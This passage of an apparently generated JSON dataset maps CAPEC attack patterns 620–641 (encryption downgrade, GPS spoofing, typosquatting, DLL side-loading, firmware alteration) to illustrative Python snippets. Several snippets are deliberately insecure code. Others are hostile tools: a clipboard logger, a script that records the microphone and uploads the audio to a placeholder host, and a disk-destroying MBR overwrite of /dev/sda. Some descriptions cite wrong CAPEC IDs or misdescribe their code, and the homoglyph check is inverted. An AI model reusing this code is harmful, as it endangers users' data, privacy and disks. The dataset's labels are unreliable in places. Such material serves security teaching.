        "description": "This Python code snippet simulates a scenario where a device broadcasts its WiFi MAC address, and an attacker tracks these broadcasts to identify the source location of the signal. The device sends broadcast messages containing its MAC address, which represents the 'Insertion of Sensitive Information Into Sent Data' (CWE-201). The attacker class simulates tracking these signals, which embodies the 'Signal Strength Tracking' attack described in the CAPEC. The code does not include actual signal strength tracking but demonstrates the concept of monitoring and tracking broadcast messages. This scenario highlights the vulnerability of exposing sensitive information through broadcast messages and the potential for attackers to exploit this information to track the source location."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import ssl\nimport socket\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but force a lower encryption level (e.g., SSLv3)\ncontext = ssl.SSLContext(ssl.PROTOCOL_SSLv3)\n\n# Insecure: Allowing weak ciphers\ncontext.set_ciphers('DES-CBC3-SHA')\n\n# Connect to a server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data\nwrapped_socket.send(b'Sensitive Information')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, making the encrypted data vulnerable. The code creates an SSL context using the outdated and insecure SSLv3 protocol and allows weak ciphers (DES-CBC3-SHA). It then establishes a connection to a server and sends sensitive information over this insecure channel. This embodies the CAPEC 'Drop Encryption Level' and highlights related CWEs such as 'Selection of Less-Secure Algorithm During Negotiation' (CWE-757) and 'Inadequate Encryption Strength' (CWE-326)."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Simulate sending sensitive data over a network\nsensitive_data = 'user_password=12345'\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a server (example IP and port)\ns.connect(('192.168.1.1', 8080))\n\n# Send data in cleartext (CWE-319)\ns.sendall(sensitive_data.encode('utf-8'))\n\n# Simulate timing discrepancies (CWE-208)\nfor i in range(5):\n    time.sleep(i * 0.1)  # Introduce observable timing discrepancies\n    s.sendall(f'packet_{i}'.encode('utf-8'))\n\n# Close the connection\ns.close()",
        "description": "This Python code snippet demonstrates the concept of 'Analysis of Packet Timing and Sizes' (CAPEC) by simulating the transmission of sensitive data over a network. The code includes several weaknesses: it sends sensitive information in cleartext (CWE-319), and it introduces observable timing discrepancies (CWE-208) by varying the sleep time before sending each packet. An attacker could intercept and log these transmissions, analyzing the metadata such as packet timing and sizes to infer sensitive information. This example highlights the risks associated with transmitting sensitive data without proper encryption and the potential for timing analysis attacks."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import os\nimport time\nimport random\nimport hashlib\n\n# Simulate cryptographic processing\nclass CryptoDevice:\n    def __init__(self, key):\n        self.key = key\n\n    def process_data(self, data):\n        # Simulate a risky cryptographic algorithm (CWE-327)\n        hash_object = hashlib.md5(data.encode() + self.key.encode())\n        return hash_object.hexdigest()\n\n# Simulate a device with improper protection against side-channel attacks (CWE-1300)\nclass VulnerableDevice(CryptoDevice):\n    def process_data(self, data):\n        # Simulate electromagnetic emissions by printing processing steps\n        print(f\"Processing data: {data}\")\n        time.sleep(random.uniform(0.01, 0.1))  # Simulate processing time\n        result = super().process_data(data)\n        print(f\"Processed result: {result}\")\n        return result\n\n# Example usage\nkey = \"secret_key\"\ndevice = VulnerableDevice(key)\n\n# Sensitive data being processed (CWE-201)\nsensitive_data = \"SensitiveInformation\"\ndevice.process_data(sensitive_data)\n",
        "description": "This Python code snippet simulates a cryptographic device that processes sensitive data using a risky cryptographic algorithm (MD5, CWE-327). The `VulnerableDevice` class extends `CryptoDevice` and simulates electromagnetic emissions by printing processing steps and introducing random delays, representing improper protection against side-channel attacks (CWE-1300). The `process_data` method processes sensitive data (CWE-201) and prints the steps, which could be monitored by an attacker to derive information about the data being processed, embodying the main idea of an Electromagnetic Side-Channel Attack (CAPEC-201)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.sensitive_data = 'SECRET_KEY'\n\n    def process_data(self, data):\n        # Simulate processing time with a delay\n        time.sleep(random.uniform(0.1, 0.5))\n        # Simulate power consumption variation\n        power_consumption = random.uniform(0.5, 1.5)\n        print(f'Processing data: {data}, Power consumption: {power_consumption}')\n        return f'Processed {data}'\n\n    def send_data(self, data):\n        # Inserting sensitive information into sent data\n        sent_data = f'{data} - {self.sensitive_data}'\n        print(f'Sending data: {sent_data}')\n        return sent_data\n\n# Example usage\nif __name__ == '__main__':\n    device = Device()\n    processed_data = device.process_data('UserInput')\n    device.send_data(processed_data)",
        "description": "This Python code snippet simulates a device that processes and sends data, embodying the concept of a Compromising Emanations Attack. The `Device` class contains sensitive information (`SECRET_KEY`) and methods to process and send data. The `process_data` method introduces a delay and simulates power consumption variations, which can be exploited by an attacker to infer sensitive operations. The `send_data` method improperly includes sensitive information in the transmitted data, making it accessible to unauthorized actors. This code demonstrates vulnerabilities related to CWEs such as improper protection of physical side channels and insertion of sensitive information into sent data."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.voltage = 3.3  # Normal operating voltage\n        self.clock_speed = 1.0  # Normal clock speed\n        self.temperature = 25  # Normal temperature in Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        if self.voltage < 2.5 or self.clock_speed > 1.5 or self.temperature < -10 or self.temperature > 85:\n            raise ValueError('Faulty behavior detected!')\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate voltage glitch\n        self.voltage = random.uniform(1.8, 2.4)\n        # Simulate clock glitch\n        self.clock_speed = random.uniform(1.6, 2.0)\n        # Simulate temperature extremes\n        self.temperature = random.choice([-20, 90])\n\n    def reset_conditions(self):\n        self.voltage = 3.3\n        self.clock_speed = 1.0\n        self.temperature = 25\n\n# Simulate device operation\ndevice = Device()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)\n\n# Simulate fault injection attack\ndevice.fault_injection_attack()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)\n\n# Reset device to normal conditions\ndevice.reset_conditions()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet simulates a hardware device performing cryptographic operations and demonstrates how fault injection attacks can disrupt its normal behavior. The `Device` class has attributes for voltage, clock speed, and temperature, which are critical parameters for its operation. The `perform_cryptographic_operation` method simulates a cryptographic operation and raises an error if the device is operating under faulty conditions. The `fault_injection_attack` method simulates various fault injection attacks by altering the device's voltage, clock speed, and temperature. The code demonstrates how these attacks can cause faulty behavior, aligning with the CAPEC description of using disruptive signals or environmental changes to exploit devices. The related CWEs provide context for the types of vulnerabilities that can be exploited, such as improper protection against voltage and clock glitches, and susceptibility to extreme temperatures."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import time\n\nclass MobileDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.clock_speed = 1.0  # GHz\n        self.voltage = 1.0  # Volts\n        self.temperature = 25  # Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        time.sleep(1)\n        return 'encrypted_data'\n\n    def check_voltage_and_clock(self):\n        if self.voltage < 0.9 or self.voltage > 1.1:\n            raise ValueError('Voltage glitch detected!')\n        if self.clock_speed < 0.9 or self.clock_speed > 1.1:\n            raise ValueError('Clock glitch detected!')\n\n    def check_temperature(self):\n        if self.temperature < 0 or self.temperature > 85:\n            raise ValueError('Temperature out of range!')\n\n    def execute(self):\n        try:\n            self.check_voltage_and_clock()\n            self.check_temperature()\n            return self.perform_cryptographic_operation()\n        except ValueError as e:\n            print(f'Error: {e}')\n            return None\n\n# Simulate a fault injection attack\ndevice = MobileDevice()\ndevice.voltage = 0.8  # Voltage glitch\nresult = device.execute()\nprint(f'Result: {result}')",
        "description": "This Python code snippet simulates a mobile device performing a cryptographic operation. The `MobileDevice` class includes methods to check for voltage and clock glitches, as well as temperature anomalies, which are common fault injection techniques. The `execute` method performs these checks before executing a cryptographic operation. If any anomalies are detected, an error is raised, simulating the device's response to fault injection attacks. The code demonstrates vulnerabilities related to improper protection against voltage and clock glitches (CWE-1247), improper handling of hardware behavior in extreme temperatures (CWE-1351), and other related weaknesses. The simulated fault injection attack sets the device's voltage to an abnormal level, triggering the protection mechanism."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# Simulate capturing an image of a touchscreen with smudges\nimage = cv2.imread('touchscreen_image_with_smudges.jpg', cv2.IMREAD_GRAYSCALE)\n\n# Apply threshold to highlight smudges\n_, smudges = cv2.threshold(image, 200, 255, cv2.THRESH_BINARY)\n\n# Find contours of the smudges\ncontours, _ = cv2.findContours(smudges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n# Draw contours on the original image\ncv2.drawContours(image, contours, -1, (0, 255, 0), 3)\n\n# Save the result to visualize the smudge pattern\ncv2.imwrite('smudge_pattern_detected.jpg', image)\n\nprint('Smudge pattern detected and saved as smudge_pattern_detected.jpg')",
        "description": "This Python code snippet simulates a smudge attack on a touchscreen device. It uses OpenCV to process an image of a touchscreen with smudges left by the user's fingers. The code highlights the smudges by applying a threshold and then finds and draws contours around these smudges. The result is saved as an image to visualize the detected smudge pattern. This demonstrates how physical side channels (oil smudges) can be exploited to reveal sensitive information (e.g., password patterns), aligning with the CAPEC description and related CWEs such as improper protection of physical side channels and excessive attack surface."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import time\nimport random\n\nclass GPSReceiver:\n    def __init__(self):\n        self.position = (0.0, 0.0)\n        self.time = time.time()\n\n    def receive_signal(self, signal):\n        # CWE-940: No verification of the source of the signal\n        self.position, self.time = signal\n\n    def get_position(self):\n        return self.position\n\n    def get_time(self):\n        return self.time\n\n# Simulate a legitimate GPS signal\nlegit_signal = ((37.7749, -122.4194), time.time())\n\n# Simulate a counterfeit GPS signal\ncounterfeit_signal = ((40.7128, -74.0060), time.time() + random.randint(1000, 10000))\n\n# Create a GPS receiver instance\nreceiver = GPSReceiver()\n\n# Receive the counterfeit signal\nreceiver.receive_signal(counterfeit_signal)\n\n# Output the spoofed position and time\nprint(\"Spoofed Position:\", receiver.get_position())\nprint(\"Spoofed Time:\", receiver.get_time())",
        "description": "This Python code snippet simulates a GPS receiver that can be deceived by counterfeit GPS signals, embodying the main idea of the CAPEC 'Counterfeit GPS Signals'. The GPSReceiver class has methods to receive signals and retrieve the current position and time. The receive_signal method does not verify the source of the signal (CWE-940), allowing an adversary to broadcast counterfeit signals. The code demonstrates this by creating a legitimate GPS signal and a counterfeit GPS signal, then feeding the counterfeit signal to the receiver. The output shows the spoofed position and time, illustrating how the receiver can be misled by unverified signals."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofingAttack:\n    def __init__(self, target_receiver):\n        self.target_receiver = target_receiver\n        self.genuine_signal_strength = 1.0\n        self.counterfeit_signal_strength = 0.1\n        self.spoofed_location = (0.0, 0.0)\n\n    def broadcast_signals(self):\n        while True:\n            # Simulate genuine signal\n            genuine_signal = self.genuine_signal_strength\n            # Simulate counterfeit signal\n            counterfeit_signal = self.counterfeit_signal_strength\n            # Gradually increase counterfeit signal strength\n            if counterfeit_signal < genuine_signal:\n                self.counterfeit_signal_strength += 0.01\n            else:\n                # Spoof the location once the counterfeit signal is stronger\n                self.spoofed_location = (random.uniform(-90, 90), random.uniform(-180, 180))\n                self.target_receiver.receive_signal(self.spoofed_location)\n            time.sleep(1)\n\nclass TargetReceiver:\n    def __init__(self):\n        self.current_location = (0.0, 0.0)\n\n    def receive_signal(self, location):\n        self.current_location = location\n        print(f\"Current Location: {self.current_location}\")\n\n# Example usage\nreceiver = TargetReceiver()\nattack = GPSSpoofingAttack(receiver)\nattack.broadcast_signals()",
        "description": "This Python code snippet simulates a GPS spoofing attack, specifically a carry-off attack. The GPSSpoofingAttack class represents the adversary's mechanism to broadcast both genuine and counterfeit GPS signals. The counterfeit signal strength is gradually increased until it surpasses the genuine signal strength, at which point the target receiver is fed spoofed location data. The TargetReceiver class simulates a GPS receiver that updates its location based on the received signal. This code embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate GPS signals to mislead the target receiver's location. The related CWEs are represented by the lack of proper verification and authentication of the signal source, allowing the spoofing attack to succeed."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\nimport time\n\nclass ResourceHandler:\n    def __init__(self):\n        self.resource = None\n\n    def acquire_resource(self):\n        self.resource = open('resource.txt', 'w')\n        self.resource.write('Resource in use')\n        print('Resource acquired')\n\n    def release_resource(self):\n        if self.resource:\n            self.resource.close()\n            print('Resource released')\n\n    def use_resource(self):\n        if self.resource:\n            print('Using resource')\n            time.sleep(5)  # Simulate long operation\n        else:\n            print('Resource not acquired')\n\n    def improper_power_consumption(self):\n        while True:\n            print('Consuming power...')\n            time.sleep(1)  # Simulate continuous power consumption\n\n    def handle_pathname(self, user_input):\n        try:\n            with open(user_input, 'r') as file:\n                print(file.read())\n        except Exception as e:\n            print(f'Error: {e}')\n\n    def check_authorization(self, user_role):\n        if user_role != 'admin':\n            print('Access denied')\n        else:\n            print('Access granted')\n\nhandler = ResourceHandler()\nhandler.acquire_resource()\nhandler.use_resource()\n# handler.release_resource()  # Uncomment to release resource\n\n# Simulate improper power consumption\n# handler.improper_power_consumption()\n\n# Simulate improper handling of Windows device names\n# handler.handle_pathname('CON')\n\n# Simulate incorrect authorization\nhandler.check_authorization('guest')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources' and its associated CWEs. The `ResourceHandler` class manages a resource, but the `release_resource` method is not always called, leading to CWE-772 (Missing Release of Resource after Effective Lifetime). The `improper_power_consumption` method simulates continuous power consumption, representing CWE-920 (Improper Restriction of Power Consumption). The `handle_pathname` method shows improper handling of user input for file paths, which can lead to CWE-67 (Improper Handling of Windows Device Names). Finally, the `check_authorization` method demonstrates CWE-863 (Incorrect Authorization) by allowing access based on a simple role check. The code highlights the importance of proper resource management, power consumption control, secure handling of user inputs, and correct authorization checks."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n# CWE-697: Incorrect Comparison\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    # Simulated user data\n    if username == 'admin' and password == 'password123':\n        return 'Login successful'\n    return 'Login failed', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate vulnerabilities related to TypoSquatting and associated CWEs. The '/redirect' route exemplifies CWE-601 (URL Redirection to Untrusted Site) by redirecting users to a URL specified in the query parameters without validation, which can be exploited for phishing attacks. The '/login' route demonstrates CWE-697 (Incorrect Comparison) by using a simple and insecure comparison for authentication, which can be easily spoofed. Together, these vulnerabilities illustrate how an attacker could exploit TypoSquatting by redirecting users to malicious sites and bypassing authentication mechanisms."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import re\nimport requests\n\ndef is_trusted_domain(domain):\n    # Simulate a list of trusted domains\n    trusted_domains = ['trusted.com', 'secure.org']\n    return domain in trusted_domains\n\ndef redirect_user(input_url):\n    # Extract domain from URL\n    domain = re.findall(r'://(.*?)/', input_url)\n    if domain:\n        domain = domain[0]\n        if is_trusted_domain(domain):\n            # Redirect to the trusted domain\n            print(f'Redirecting to {input_url}')\n        else:\n            # Redirect to an untrusted domain (vulnerable to SoundSquatting)\n            print('Warning: Redirecting to an untrusted domain!')\n            print(f'Redirecting to {input_url}')\n    else:\n        print('Invalid URL')\n\n# Example usage\nuser_input_url = 'http://trvsted.com/login'\nredirect_user(user_input_url)",
        "description": "This Python code snippet demonstrates a vulnerability related to SoundSquatting and several related CWEs. The function `redirect_user` takes a user-provided URL and attempts to redirect the user based on the domain extracted from the URL. The `is_trusted_domain` function checks if the domain is in a list of trusted domains. If the domain is not trusted, the code prints a warning but still proceeds to redirect the user, illustrating CWE-601 (Open Redirect). The code also highlights CWE-348 (Use of Less Trusted Source) by not verifying the domain thoroughly, and CWE-290 (Authentication Bypass by Spoofing) by potentially allowing spoofed domains to be treated as trusted. This snippet embodies the main idea of SoundSquatting by showing how an adversary could exploit user confusion over similar-sounding domain names to redirect traffic to malicious sites."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\n\n# Simulate a user input for a URL\nuser_input = 'http://example.com'\n\n# A list of trusted domains\ntrusted_domains = ['example.com', 'trusted.com']\n\n# Function to check if the domain is trusted\ndef is_trusted_domain(url):\n    # Extract the domain from the URL\n    domain = re.findall(r'://([^/]+)', url)\n    if domain:\n        domain = domain[0]\n        # Check for homographs by comparing with trusted domains\n        for trusted in trusted_domains:\n            if domain == trusted:\n                return True\n            # Check for homoglyphs (simplified example)\n            if domain.replace('e', '\u0435') == trusted:  # '\u0435' is a Cyrillic character\n                return True\n    return False\n\n# Check if the user input is a trusted domain\nif is_trusted_domain(user_input):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')",
        "description": "This Python code snippet demonstrates a simplified version of a homograph attack detection mechanism. The `is_trusted_domain` function checks if a given URL belongs to a list of trusted domains. It includes a basic check for homoglyphs by replacing the Latin character 'e' with the Cyrillic character '\u0435', which looks visually similar. This example highlights the vulnerability described in CAPEC-1007, where insufficient visual distinction of homoglyphs can lead to security issues. The code also touches on CWE-86 and CWE-84 by showing how improper neutralization of characters can be exploited. The regular expression used to extract the domain is not anchored, which relates to CWE-777, and the function does not ensure the request is sent to the expected destination, touching on CWE-918."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\nSECRET_KEY = 'secret'\n\n# Simulate a user database\nusers = {\n    'user1': 'password1',\n    'user2': 'password2'\n}\n\n# Generate JWT token\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.json.get('username')\n    password = request.json.get('password')\n    if username in users and users[username] == password:\n        token = jwt.encode({'username': username}, SECRET_KEY, algorithm='HS256')\n        return jsonify({'token': token})\n    return jsonify({'message': 'Invalid credentials'}), 401\n\n# Access protected resource\n@app.route('/protected', methods=['GET'])\ndef protected():\n    token = request.headers.get('Authorization')\n    if not token:\n        return jsonify({'message': 'Token is missing'}), 403\n    try:\n        data = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        # Improperly validate token, allowing impersonation\n        if 'username' in data:\n            return jsonify({'message': f'Welcome {data[\"username\"]}'}), 200\n    except jwt.ExpiredSignatureError:\n        return jsonify({'message': 'Token has expired'}), 403\n    except jwt.InvalidTokenError:\n        return jsonify({'message': 'Invalid token'}), 403\n    return jsonify({'message': 'Unauthorized access'}), 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask application that uses JWT tokens for authentication. The '/login' endpoint generates a JWT token for a user if the provided credentials match those in the simulated user database. The '/protected' endpoint is a protected resource that requires a valid JWT token for access. However, the code contains a vulnerability where the token is improperly validated, allowing an attacker to impersonate another user by crafting a token with a different username. This represents the main idea of the CAPEC 'Token Impersonation' and is related to CWEs such as 'Improper Authentication' and 'Generation of Incorrect Security Tokens'."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import pyaudio\nimport wave\nimport requests\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Function to record audio from the microphone\ndef record_audio(filename, duration=5):\n    chunk = 1024  # Record in chunks of 1024 samples\n    sample_format = pyaudio.paInt16  # 16 bits per sample\n    channels = 1\n    fs = 44100  # Record at 44100 samples per second\n    p = pyaudio.PyAudio()\n\n    print('Recording...')\n    stream = p.open(format=sample_format,\n                    channels=channels,\n                    rate=fs,\n                    frames_per_buffer=chunk,\n                    input=True)\n\n    frames = []\n    for _ in range(0, int(fs / chunk * duration)):\n        data = stream.read(chunk)\n        frames.append(data)\n\n    stream.stop_stream()\n    stream.close()\n    p.terminate()\n\n    print('Finished recording')\n\n    wf = wave.open(filename, 'wb')\n    wf.setnchannels(channels)\n    wf.setsampwidth(p.get_sample_size(sample_format))\n    wf.setframerate(fs)\n    wf.writeframes(b''.join(frames))\n    wf.close()\n\n# Function to send recorded audio to a remote server (in cleartext)\ndef send_audio(filename, url):\n    with open(filename, 'rb') as f:\n        files = {'file': (filename, f, 'audio/wav')}\n        response = requests.post(url, files=files)\n        print('Audio sent, server response:', response.text)\n\n# Record audio and send it to a remote server\nrecord_audio('output.wav')\nsend_audio('output.wav', 'http://example.com/upload')\n",
        "description": "This Python code snippet demonstrates a potential security vulnerability by recording audio from the microphone and sending it to a remote server in cleartext. The code leverages the PyAudio library to capture audio and the requests library to transmit the recorded audio file. This embodies the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's audio functionalities to capture sensitive information. The code also highlights several CWEs: CWE-267 (Privilege Defined With Unsafe Actions) by allowing the recording without proper authorization checks, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing the recorded audio, and CWE-319 (Cleartext Transmission of Sensitive Information) by sending the audio file over an unencrypted HTTP connection."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\n# Function to handle file upload\ndef handle_file_upload(file_path):\n    # Check the file extension\n    if file_path.endswith('.txt'):\n        # Open the file assuming it's a text file\n        with open(file_path, 'r') as file:\n            content = file.read()\n            print('File content:', content)\n    else:\n        print('Unsupported file type')\n\n# Simulate file upload\nuploaded_file = 'malicious.exe.txt'\nhandle_file_upload(uploaded_file)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Alternative Execution Due to Deceptive Filenames' (CAPEC). The function `handle_file_upload` checks the file extension to determine if it should be processed as a text file. However, an attacker can upload a file with a deceptive filename like 'malicious.exe.txt'. The code incorrectly assumes the file is safe based on its '.txt' extension, potentially leading to the execution of malicious code. This snippet embodies CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-73 (External Control of File Name or Path), highlighting the risks of relying solely on file extensions for security decisions."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\n\n# Function to hide malicious code in a file's metadata\n\ndef hide_malicious_code(file_path, malicious_code):\n    # Open the file in append binary mode\n    with open(file_path, 'ab') as file:\n        # Append the malicious code to the end of the file\n        file.write(b'\\x00' * 1024)  # Padding to hide the code\n        file.write(malicious_code.encode('utf-8'))\n\n# Example usage\nfile_path = 'example.txt'\nmalicious_code = 'print(\"This is malicious code\")'\n\n# Create a dummy file\nwith open(file_path, 'w') as file:\n    file.write('This is a normal file content.')\n\n# Hide the malicious code in the file's metadata\nhide_malicious_code(file_path, malicious_code)\n\n# Verify the file content (normal usage won't show the hidden code)\nwith open(file_path, 'r') as file:\n    print(file.read())",
        "description": "This Python code snippet demonstrates how an attacker might hide malicious code within a file's metadata. The `hide_malicious_code` function appends the malicious code to the end of a file, padding it with null bytes to obscure its presence. This approach leverages the concept of 'Hiding Malicious Data or Code within Files' (CAPEC) and touches on related CWEs such as 'Embedded Malicious Code' (CWE-506) and 'Cleartext Storage in a File or on Disk' (CWE-313). The example usage creates a dummy file and hides a simple malicious Python command within it. Normal file operations, like reading the file content, won't reveal the hidden code, making it difficult to detect."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\n\n# Simulate a malicious application that logs clipboard data\nlog_file = 'clipboard_log.txt'\n\nwhile True:\n    clipboard_data = pyperclip.paste()\n    with open(log_file, 'a') as f:\n        f.write(f'{clipboard_data}\\n')\n    time.sleep(5)  # Log clipboard data every 5 seconds",
        "description": "This Python code snippet demonstrates a simple malicious application that continuously logs clipboard data to a file. The code uses the 'pyperclip' library to access the clipboard contents and writes the data to 'clipboard_log.txt' every 5 seconds. This embodies the CAPEC 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to gather sensitive information. The related CWEs are represented as follows: CWE-267 (Privilege Defined With Unsafe Actions) is implied by the application's ability to access clipboard data without proper authorization; CWE-318 and CWE-317 (Cleartext Storage of Sensitive Information in Executable/GUI) are represented by storing clipboard data in cleartext within the log file; CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by the unauthorized logging of potentially sensitive clipboard data."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\nimport struct\n\n# Simulate a vulnerable MBR modification\nMBR_SIZE = 512\nPAYLOAD = b'\\x90' * 100  # NOP sled as a placeholder for malicious payload\n\n# Read the current MBR\nwith open('/dev/sda', 'rb') as disk:\n    mbr = disk.read(MBR_SIZE)\n\n# Check if the MBR is already infected (simplified check)\nif b'MY_MBR_PAYLOAD' not in mbr:\n    # Create a new MBR with the payload\n    new_mbr = mbr[:MBR_SIZE - len(PAYLOAD)] + PAYLOAD\n    new_mbr += b'MY_MBR_PAYLOAD'  # Marker for the payload\n\n    # Write the new MBR back to the disk\n    with open('/dev/sda', 'wb') as disk:\n        disk.write(new_mbr)\n\n# Simulate boot process (simplified)\ndef boot_system():\n    if b'MY_MBR_PAYLOAD' in new_mbr:\n        print(\"Executing malicious payload...\")\n        # Execute the payload (placeholder)\n        os.system('/bin/echo \"Malicious code executed\"')\n\nboot_system()",
        "description": "This Python code snippet simulates the process of modifying the Master Boot Record (MBR) of a hard disk to include a malicious payload, embodying the main idea of the CAPEC 'Altered Component Firmware'. The code reads the current MBR, checks if it is already infected, and if not, appends a payload to it. The new MBR is then written back to the disk. During the simulated boot process, the presence of the payload marker triggers the execution of the malicious code. This example highlights vulnerabilities such as improper access control for volatile memory (CWE-1274), missing immutable root of trust (CWE-1326), and insufficient granularity of access control (CWE-1220)."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file to store sensitive information\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: Password123')\n    temp_file_path = temp_file.name\n\n# Improperly set file permissions (world-readable)\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive information is stored in a temporary file with improper access permissions. The code creates a temporary file and writes sensitive information to it. However, it sets the file permissions to be world-readable (0o644), making the file accessible to unauthorized users. This embodies the main idea of the CAPEC 'Probe System Files' by showing how sensitive information can be exposed due to improperly protected files. The related CWEs are represented by the use of insecure temporary files (CWE-377) and making files accessible to external parties (CWE-552)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport os\nimport sys\n\n# Vulnerable function to load a DLL from an untrusted source\n# CWE-114: Process Control\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\ndef load_untrusted_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded DLL from {dll_path}\")\n    except Exception as e:\n        print(f\"Failed to load DLL: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <path_to_dll>\")\n        sys.exit(1)\n\n    dll_path = sys.argv[1]\n    load_untrusted_dll(dll_path)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that loads a DLL from an untrusted source, embodying the main idea of the CAPEC 'Inclusion of Code in Existing Process'. The function `load_untrusted_dll` uses the `ctypes` library to load a DLL specified by the user. This represents CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it allows the execution of potentially malicious code from an untrusted source. An attacker could exploit this to inject arbitrary code into the address space of a running process, potentially leading to privilege escalation or evasion of detection defenses."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\nimport ctypes\n\n# Simulate a vulnerable application loading a DLL\n# This is an example of CWE-427: Uncontrolled Search Path Element\n# and CWE-426: Untrusted Search Path\n\ndef load_dll(dll_name):\n    try:\n        # Attempt to load the DLL from the current directory\n        dll_path = os.path.join(os.getcwd(), dll_name)\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded {dll_name} from {dll_path}\")\n    except OSError as e:\n        print(f\"Failed to load {dll_name}: {e}\")\n\n# Example usage\nload_dll('example.dll')\n",
        "description": "This Python code snippet demonstrates a simplified version of DLL side-loading vulnerability. The `load_dll` function attempts to load a DLL from the current working directory using `ctypes.CDLL`. This represents CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the DLL is loaded from a potentially untrusted location. An attacker could place a malicious DLL named 'example.dll' in the current directory, which would then be loaded by the application instead of the legitimate DLL, leading to potential exploitation."
    },
    {
